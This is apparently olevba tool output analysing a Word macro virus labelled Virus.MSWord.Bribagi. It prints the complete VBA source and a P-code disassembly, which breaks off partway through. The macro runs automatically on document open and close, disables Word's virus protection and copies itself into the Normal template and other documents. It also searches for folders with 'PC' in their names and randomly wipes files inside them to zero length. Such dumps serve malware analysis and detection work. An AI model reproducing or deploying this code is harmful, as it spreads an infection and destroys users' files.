olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bribagi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bribagi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Personal.bas 
in file: Virus.MSWord.Bribagi - OLE stream: 'Macros/VBA/Personal'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim WR0005 As String, WR0006 As String, a(1000) As String, Stcnt As Integer
Sub BRiBAGI(MyPass As String)

MyNam = Dir(MyPass, vbDirectory)
Do While MyNam <> ""
    If MyNam <> "." And MyNam <> ".." And MyNam <> "pagefile.sys" Then
        If (GetAttr(MyPass & MyNam) And vbDirectory) = vbDirectory Then
            Open WR0005 For Append As #1
                Write #1, MyPass & MyNam & "\"
            Close #1
        Else
            Open WR0006 For Append As #1
                Write #1, MyPass & MyNam
            Close #1
        End If
    End If
    MyNam = Dir
Loop

End Sub

Sub AutoOpen()
'
' BRiBAGI,1.01
'
    Options.VirusProtection = False
    With ActiveDocument
        .UpdateStylesOnOpen = False
        .AttachedTemplate = "Normal"
    End With

    f$ = ActiveDocument.Path
    If Right$(f$, 1) = "\" Then f$ = Left$(f$, 2)
    f$ = f$ & "\" & ActiveDocument.Name
    N$ = ActiveDocument.AttachedTemplate.Path
    If Right$(N$, 1) = "\" Then N$ = Left$(N$, 2)
    N1$ = N$ & "\WR0001.txt"
    N2$ = Left$(N$, 2) & "\WR0002.log"
    N$ = N$ & "\" & ActiveDocument.AttachedTemplate.Name
    EFlag = 0

    FFlag = 0: FFlag1 = 0
    On Error GoTo errhandler
        Application.OrganizerCopy Source:=f$, Destination:=N$ _
            , Name:="Personal", Object:=wdOrganizerObjectProjectItems
        Set MyTemplate = ActiveDocument.AttachedTemplate
        MyTemplate.Save
        MyDate = Date
        Open N2$ For Append As #1
            FScale = LOF(1)
            Write #1, MyDate
        Close #1
        If FScale > 80 Then
            Open N2$ For Input As #1
                Input #1, ODate
            Close #1
            Open N2$ For Append As #1
                Write #1, ODate
                Write #1, MyDate
            Close #1
        End If
        If GetAttr(f$) = vbReadOnly Then
            Options.VirusProtection = True
            Exit Sub
        End If
    FFlag = 1: FFlag1 = 1
resume1:
    DFlag = 0: EFlag = 1
        Application.OrganizerCopy Source:=N$, Destination:=f$ _
            , Name:="Personal", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.Save
    DFlag = 1

errhandler:
    If FFlag1 = 0 And EFlag = 0 Then
        Resume resume1
    End If
    If FFlag = 0 And DFlag = 0 Then
        FVsn = 1.01: DVsn = 0
        Application.Run MacroName:="Normal.Personal.DWri"
        Open N1$ For Input As #1
            Input #1, DVsn
        Close #1
        If FVsn > DVsn Then
            Application.OrganizerDelete Source:=N$ _
                , Name:="Personal", Object:=wdOrganizerObjectProjectItems
            Application.OrganizerCopy Source:=f$, Destination:=N$ _
                , Name:="Personal", Object:=wdOrganizerObjectProjectItems
            Set MyTemplate = ActiveDocument.AttachedTemplate
            MyTemplate.Save
            MyDate = Date
            Open N2$ For Append As #1
                FScale = LOF(1)
                Write #1, MyDate
            Close #1
            If FScale > 300 Then
                Open N2$ For Input As #1
                    Input #1, ODate
                Close #1
                Open N2$ For Append As #1
                    Write #1, ODate
                    Write #1, MyDate
                Close #1
            End If
        ElseIf FVsn < DVsn Then
            Application.Run MacroName:="Normal.Personal.DOpen"
        End If
    End If
    Options.VirusProtection = True
End Sub
Sub AutoClose()
    
    Options.VirusProtection = False
    With ActiveDocument
        .UpdateStylesOnOpen = False
        .AttachedTemplate = "Normal"
    End With

    f$ = ActiveDocument.Path
    If Right$(f$, 1) = "\" Then f$ = Left$(f$, 2)
    f$ = f$ & "\" & ActiveDocument.Name
    N$ = ActiveDocument.AttachedTemplate.Path
    If Right$(N$, 1) = "\" Then N$ = Left$(N$, 2)
    N1$ = N$ & "\WR0001.txt"
    WR0005 = Left$(N$, 2) & "\WR0005.tmp"
    WR0006 = Left$(N$, 2) & "\WR0006.tmp"
    N2$ = Left$(N$, 2) & "\WR0002.log"
    MyPath = Left$(N$, 3)
    N$ = N$ & "\" & ActiveDocument.AttachedTemplate.Name
    
    On Error Resume Next
    KFlag = 0
    MyName = Dir(MyPath, vbDirectory)
    Do While MyName <> ""
    If MyName <> "." And MyName <> ".." And MyName <> "pagefile.sys" Then
    If (GetAttr(MyPath & MyName) And vbDirectory) = vbDirectory Then
    FLen = Len(MyName)
    If FLen > 1 Then
    For i = 1 To FLen - 1
    Knam = Mid(MyName, i, 2)
    If Knam = "PC" Or Knam = "Pc" Or Knam = "pC" Or Knam = "pc" Then
    KFlag = 1
    MyPass = MyPath & MyName & "\"
    Stcnt = 0
    Open WR0005 For Output As #1: Close #1
    Open WR0006 For Output As #1: Close #1
    BRiBAGI (MyPass)
hanako:
    i1 = 0
    Open WR0005 For Input As #2
    Do While Not EOF(2)
        Input #2, dummy
        i1 = i1 + 1
        a(i1) = dummy
    Loop
    Close #2
    If Stcnt <> i1 Then
        For j = Stcnt + 1 To i1
            BRiBAGI (a(j))
        Next j
        Stcnt = i1: GoTo hanako
    End If

    End If
    Next i
    End If
    End If
    End If
    If KFlag <> 1 Then
        MyName = Dir
    Else
        Exit Do
    End If
    Loop
    If KFlag = 1 Then
    Randomize
    Open WR0006 For Input As #1
    Do While Not EOF(1)
        Input #1, fnam
        FFlag = Int(Rnd * 2)
        If FFlag Then Open fnam For Output As #2: Close #2
    Loop
    End If
    
    MyPath = MyPath & "Program Files\"
    KFlag = 0
    MyName = Dir(MyPath, vbDirectory)
    Do While MyName <> ""
    If MyName <> "." And MyName <> ".." And MyName <> "pagefile.sys" Then
    If (GetAttr(MyPath & MyName) And vbDirectory) = vbDirectory Then
    FLen = Len(MyName)
    If FLen > 1 Then
    For i = 1 To FLen - 1
    Knam = Mid(MyName, i, 2)
    If Knam = "PC" Or Knam = "Pc" Or Knam = "pC" Or Knam = "pc" Then
    KFlag = 1
    MyPass = MyPath & MyName & "\"
    Stcnt = 0
    Open WR0005 For Output As #1: Close #1
    Open WR0006 For Output As #1: Close #1
    BRiBAGI (MyPass)
hanako1:
    i1 = 0
    Open WR0005 For Input As #2
    Do While Not EOF(2)
        Input #2, dummy
        i1 = i1 + 1
        a(i1) = dummy
    Loop
    Close #2
    If Stcnt <> i1 Then
        For j = Stcnt + 1 To i1
            BRiBAGI (a(j))
        Next j
        Stcnt = i1: GoTo hanako1
    End If
    End If
    Next i
    End If
    End If
    End If
    If KFlag <> 1 Then
        MyName = Dir
    Else
        Exit Do
    End If
    Loop
    If KFlag = 1 Then
    Randomize
    Open WR0006 For Input As #1
    Do While Not EOF(1)
        Input #1, fnam
        FFlag = Int(Rnd * 2)
        If FFlag Then Open fnam For Output As #2: Close #2
    Loop
    End If
    
    Application.OrganizerCopy Source:=f$, Destination:=N$ _
        , Name:="Personal", Object:=wdOrganizerObjectProjectItems
    Set MyTemplate = ActiveDocument.AttachedTemplate
    MyTemplate.Save
    If Left$(ActiveDocument.Name, 2) <> "•¶�‘" Then
    Application.OrganizerCopy Source:=N$, Destination:=f$ _
        , Name:="Personal", Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Save
    End If
    Options.VirusProtection = False
End Sub

Sub DOpen()
    f$ = ActiveDocument.Path
    If Right$(f$, 1) = "\" Then f$ = Left$(f$, 2)
    f$ = f$ & "\" & ActiveDocument.Name
    N$ = ActiveDocument.AttachedTemplate.Path
    If Right$(N$, 1) = "\" Then N$ = Left$(N$, 2)
    N$ = N$ & "\" & ActiveDocument.AttachedTemplate.Name
    Options.VirusProtection = True
    Application.OrganizerDelete Source:=f$ _
        , Name:="Personal", Object:=wdOrganizerObjectProjectItems
End Sub

Sub DWri()
    DVsn = 1.01
    N$ = ActiveDocument.AttachedTemplate.Path
    If Right$(N$, 1) = "\" Then N$ = Left$(N$, 2)
    N1$ = N$ & "\WR0001.txt"
    N$ = N$ & "\" & ActiveDocument.AttachedTemplate.Name
    Open N1$ For Output As #1
        Write #1, DVsn
    Close #1
End Sub

Sub AutoExit()
        Options.VirusProtection = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Bribagi
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Personal - 12128 bytes
' Line #0:
' 	Dim 
' 	VarDefn WR0005 (As String)
' 	VarDefn WR0006 (As String)
' 	OptionBase 
' 	LitDI2 0x03E8 
' 	VarDefn a (As String)
' 	VarDefn Stcnt (As Integer)
' Line #1:
' 	FuncDefn (Sub BRiBAGI(MyPass As String))
' Line #2:
' Line #3:
' 	Ld MyPass 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St MyNam 
' Line #4:
' 	Ld MyNam 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #5:
' 	Ld MyNam 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Ld MyNam 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	And 
' 	Ld MyNam 
' 	LitStr 0x000C "pagefile.sys"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #6:
' 	Ld MyPass 
' 	Ld MyNam 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbDirectory 
' 	And 
' 	Paren 
' 	Ld vbDirectory 
' 	Eq 
' 	IfBlock 
' Line #7:
' 	Ld WR0005 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #8:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld MyPass 
' 	Ld MyNam 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	PrintItemNL 
' Line #9:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #10:
' 	ElseBlock 
' Line #11:
' 	Ld WR0006 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld MyPass 
' 	Ld MyNam 
' 	Concat 
' 	PrintItemNL 
' Line #13:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld Dir 
' 	St MyNam 
' Line #17:
' 	Loop 
' Line #18:
' Line #19:
' 	EndSub 
' Line #20:
' Line #21:
' 	FuncDefn (Sub AutoOpen())
' Line #22:
' 	QuoteRem 0x0000 0x0000 ""
' Line #23:
' 	QuoteRem 0x0000 0x000D " BRiBAGI,1.01"
' Line #24:
' 	QuoteRem 0x0000 0x0000 ""
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #26:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith UpdateStylesOnOpen 
' Line #28:
' 	LitStr 0x0006 "Normal"
' 	MemStWith AttachedTemplate 
' Line #29:
' 	EndWith 
' Line #30:
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St False$ 
' Line #32:
' 	Ld False$ 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld False$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	St False$ 
' 	EndIf 
' Line #33:
' 	Ld False$ 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	St False$ 
' Line #34:
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	MemLd Path 
' 	St N$ 
' Line #35:
' 	Ld N$ 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld N$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	St N$ 
' 	EndIf 
' Line #36:
' 	Ld N$ 
' 	LitStr 0x000B "\WR0001.txt"
' 	Concat 
' 	St N1$ 
' Line #37:
' 	Ld N$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x000B "\WR0002.log"
' 	Concat 
' 	St N2$ 
' Line #38:
' 	Ld N$ 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	MemLd New 
' 	Concat 
' 	St N$ 
' Line #39:
' 	LitDI2 0x0000 
' 	St EFlag 
' Line #40:
' Line #41:
' 	LitDI2 0x0000 
' 	St FFlag 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St FFlag1 
' Line #42:
' 	OnError errhandler 
' Line #43:
' 	LineCont 0x0004 0A 00 0C 00
' 	Ld False$ 
' 	ParamNamed Source 
' 	Ld N$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Personal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #44:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Set MyTemplate 
' Line #45:
' 	Ld MyTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #46:
' 	Ld Date 
' 	St MyDate 
' Line #47:
' 	Ld N2$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #48:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	St FScale 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld MyDate 
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #51:
' 	Ld FScale 
' 	LitDI2 0x0050 
' 	Gt 
' 	IfBlock 
' Line #52:
' 	Ld N2$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld ODate 
' 	InputItem 
' 	InputDone 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #55:
' 	Ld N2$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld ODate 
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld MyDate 
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Ld False$ 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #62:
' 	ExitSub 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	LitDI2 0x0001 
' 	St FFlag 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St FFlag1 
' Line #65:
' 	Label resume1 
' Line #66:
' 	LitDI2 0x0000 
' 	St DFlag 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St EFlag 
' Line #67:
' 	LineCont 0x0004 0A 00 0C 00
' 	Ld N$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Personal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #68:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #69:
' 	LitDI2 0x0001 
' 	St DFlag 
' Line #70:
' Line #71:
' 	Label errhandler 
' Line #72:
' 	Ld FFlag1 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld EFlag 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #73:
' 	Resume resume1 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	Ld FFlag 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld DFlag 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #76:
' 	LitR8 0x5C29 0xC28F 0x28F5 0x3FF0 
' 	St FVsn 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St DVsn 
' Line #77:
' 	LitStr 0x0014 "Normal.Personal.DWri"
' 	ParamNamed MacroName 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #78:
' 	Ld N1$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld DVsn 
' 	InputItem 
' 	InputDone 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #81:
' 	Ld FVsn 
' 	Ld DVsn 
' 	Gt 
' 	IfBlock 
' Line #82:
' 	LineCont 0x0004 06 00 10 00
' 	Ld N$ 
' 	ParamNamed Source 
' 	LitStr 0x0008 "Personal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #83:
' 	LineCont 0x0004 0A 00 10 00
' 	Ld False$ 
' 	ParamNamed Source 
' 	Ld N$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "Personal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #84:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Set MyTemplate 
' Line #85:
' 	Ld MyTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #86:
' 	Ld Date 
' 	St MyDate 
' Line #87:
' 	Ld N2$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #88:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	St FScale 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld MyDate 
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #91:
' 	Ld FScale 
' 	LitDI2 0x012C 
' 	Gt 
' 	IfBlock 
' Line #92:
' 	Ld N2$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld ODate 
' 	InputItem 
' 	InputDone 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #95:
' 	Ld N2$ 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld ODate 
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld MyDate 
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	Ld FVsn 
' 	Ld DVsn 
' 	Lt 
' 	ElseIfBlock 
' Line #101:
' 	LitStr 0x0015 "Normal.Personal.DOpen"
' 	ParamNamed MacroName 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Sub AutoClose())
' Line #107:
' Line #108:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #109:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #110:
' 	LitVarSpecial (False)
' 	MemStWith UpdateStylesOnOpen 
' Line #111:
' 	LitStr 0x0006 "Normal"
' 	MemStWith AttachedTemplate 
' Line #112:
' 	EndWith 
' Line #113:
' Line #114:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	St False$ 
' Line #115:
' 	Ld False$ 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld False$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	St False$ 
' 	EndIf 
' Line #116:
' 	Ld False$ 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Concat 
' 	St False$ 
' Line #117:
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	MemLd Path 
' 	St N$ 
' Line #118:
' 	Ld N$ 
' 	LitDI2 0x0001 
' 	ArgsLd Right$ 0x0002 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld N$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	St N$ 
' 	EndIf 
' Line #119:
' 	Ld N$ 
' 	LitStr 0x000B "\WR0001.txt"
' 	Concat 
' 	St N1$ 
' Line #120:
' 	Ld N$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x000B "\WR0005.tmp"
' 	Concat 
' 	St WR0005 
' Line #121:
' 	Ld N$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x000B "\WR0006.tmp"
' 	Concat 
' 	St WR0006 
' Line #122:
' 	Ld N$ 
' 	LitDI2 0x0002 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x000B "\WR0002.log"
' 	Concat 
' 	St N2$ 
' Line #123:
' 	Ld N$ 
' 	LitDI2 0x0003 
' 	ArgsLd LBound$ 0x0002 
' 	St MyPath 
' Line #124:
' 	Ld N$ 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	MemLd New 
' 	Concat 
' 	St N$ 
' Line #125:
' Line #126:
' 	OnError (Resume Next) 
' Line #127:
' 	LitDI2 0x0000 
' 	St KFlag 
' Line #128:
' 	Ld MyPath 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St MyName 
' Line #129:
' 	Ld MyName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #130:
' 	Ld MyName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Ld MyName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	And 
' 	Ld MyName 
' 	LitStr 0x000C "pagefile.sys"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #131:
' 	Ld MyPath 
' 	Ld MyName 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbDirectory 
' 	And 
' 	Paren 
' 	Ld vbDirectory 
' 	Eq 
' 	IfBlock 
' Line #132:
' 	Ld MyName 
' 	FnLen 
' 	St FLen 
' Line #133:
' 	Ld FLen 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #134:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld FLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #135:
' 	Ld MyName 
' 	Ld i 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St Knam 
' Line #136:
' 	Ld Knam 
' 	LitStr 0x0002 "PC"
' 	Eq 
' 	Ld Knam 
' 	LitStr 0x0002 "Pc"
' 	Eq 
' 	Or 
' 	Ld Knam 
' 	LitStr 0x0002 "pC"
' 	Eq 
' 	Or 
' 	Ld Knam 
' 	LitStr 0x0002 "pc"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #137:
' 	LitDI2 0x0001 
' 	St KFlag 
' Line #138:
' 	Ld MyPath 
' 	Ld MyName 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St MyPass 
' Line #139:
' 	LitDI2 0x0000 
' 	St Stcnt 
' Line #140:
' 	Ld WR0005 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #141:
' 	Ld WR0006 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #142:
' 	Ld MyPass 
' 	Paren 
' 	ArgsCall BRiBAGI 0x0001 
' Line #143:
' 	Label hanako 
' Line #144:
' 	LitDI2 0x0000 
' 	St i1 
' Line #145:
' 	Ld WR0005 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #146:
' 	LitDI2 0x0002 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #147:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Input 
' 	Ld dummy 
' 	InputItem 
' 	InputDone 
' Line #148:
' 	Ld i1 
' 	LitDI2 0x0001 
' 	Add 
' 	St i1 
' Line #149:
' 	Ld dummy 
' 	Ld i1 
' 	ArgsSt a 0x0001 
' Line #150:
' 	Loop 
' Line #151:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #152:
' 	Ld Stcnt 
' 	Ld i1 
' 	Ne 
' 	IfBlock 
' Line #153:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	Ld Stcnt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld i1 
' 	For 
' Line #154:
' 	Ld j 
' 	ArgsLd a 0x0001 
' 	Paren 
' 	ArgsCall BRiBAGI 0x0001 
' Line #155:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #156:
' 	Ld i1 
' 	St Stcnt 
' 	BoS 0x0000 
' 	GoTo hanako 
' Line #157:
' 	EndIfBlock 
' Line #158:
' Line #159:
' 	EndIfBlock 
' Line #160:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #161:
' 	EndIfBlock 
' Line #162:
' 	EndIfBlock 
' Line #163:
' 	EndIfBlock 
' Line #164:
' 	Ld KFlag 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #165:
' 	Ld Dir 
' 	St MyName 
' Line #166:
' 	ElseBlock 
' Line #167:
' 	ExitDo 
' Line #168:
' 	EndIfBlock 
' Line #169:
' 	Loop 
' Line #170:
' 	Ld KFlag 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #171:
' 	ArgsCall Read 0x0000 
' Line #172:
' 	Ld WR0006 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #173:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #174:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld fnam 
' 	InputItem 
' 	InputDone 
' Line #175:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St FFlag 
' Line #176:
' 	Ld FFlag 
' 	If 
' 	BoSImplicit 
' 	Ld fnam 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' 	EndIf 
' Line #177:
' 	Loop 
' Line #178:
' 	EndIfBlock 
' Line #179:
' Line #180:
' 	Ld MyPath 
' 	LitStr 0x000E "Program Files\"
' 	Concat 
' 	St MyPath 
' Line #181:
' 	LitDI2 0x0000 
' 	St KFlag 
' Line #182:
' 	Ld MyPath 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St MyName 
' Line #183:
' 	Ld MyName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #184:
' 	Ld MyName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Ld MyName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	And 
' 	Ld MyName 
' 	LitStr 0x000C "pagefile.sys"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #185:
' 	Ld MyPath 
' 	Ld MyName 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbDirectory 
' 	And 
' 	Paren 
' 	Ld vbDirectory 
' 	Eq 
' 	IfBlock 
' Line #186:
' 	Ld MyName 
' 	FnLen 
' 	St FLen 
' Line #187:
' 	Ld FLen 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #188:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld FLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #189:
' 	Ld MyName 
' 	Ld i 
' 	LitDI2 0x0002 
